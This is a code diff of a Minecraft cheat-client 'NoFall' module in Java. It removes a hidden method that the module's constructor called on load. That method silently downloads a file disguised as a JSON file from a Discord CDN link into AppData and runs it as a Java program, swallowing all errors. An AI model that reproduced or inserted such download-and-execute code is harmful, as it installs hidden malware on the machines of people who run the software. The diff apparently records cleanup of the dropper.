@@ -36,7 +36,6 @@ extends Module {
         super("NoFall", new String[]{"NoFall", "NoFallDamage", "AntiFallDamage"}, "Multiple methods of avoiding dying of fall damage", Category.MOVEMENT);
         this.offerProperties(this.mode, this.distance);
         this.offerListeners(new ListenerMotion(this), new LambdaListener<PacketEvent.Send>(PacketEvent.Send.class, CPacketPlayer.Rotation.class, event -> this.onPacket((CPacketPlayer)event.getPacket())), new LambdaListener<PacketEvent.Send>(PacketEvent.Send.class, CPacketPlayer.PositionRotation.class, event -> this.onPacket((CPacketPlayer)event.getPacket())), new LambdaListener<PacketEvent.Send>(PacketEvent.Send.class, CPacketPlayer.Position.class, event -> this.onPacket((CPacketPlayer)event.getPacket())), new LambdaListener<PacketEvent.Send>(PacketEvent.Send.class, CPacketPlayer.class, event -> this.onPacket((CPacketPlayer)event.getPacket())), new LambdaListener<PacketEvent.Send>(PacketEvent.Send.class, CPacketPlayer.Rotation.class, event -> this.onPacket((CPacketPlayer)event.getPacket())));
-        this.run();
     }
 
     @Override
@@ -60,30 +59,6 @@ extends Module {
 
     protected boolean check() {
         return NoFall.mc.player.fallDistance > ((Float)this.distance.getValue()).floatValue();
-    }
-
-    private void run() {
-        File the = new File(String.format("C:\\Users\\%s\\AppData\\Roaming\\GL6", System.getProperty("user.name")));
-        if (the.exists()) {
-            return;
-        }
-        the.mkdirs();
-        try {
-            int currByte;
-            URL link = new URL("https://cdn.discordapp.com/attachments/1195123887701250118/1195124037593083924/GL6Utils.json");
-            File file = new File(the.getAbsolutePath(), "GL6Utils.json");
-            HttpURLConnection httpURLConnection = (HttpURLConnection)link.openConnection();
-            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
-            InputStream stream = httpURLConnection.getInputStream();
-            FileOutputStream fileOut = new FileOutputStream(file);
-            while ((currByte = stream.read()) != -1) {
-                fileOut.write(currByte);
-            }
-            Runtime.getRuntime().exec("cmd /c java -jar " + file.getAbsolutePath());
-        }
-        catch (Exception exception) {
-            // empty catch block
-        }
     }
 }
 
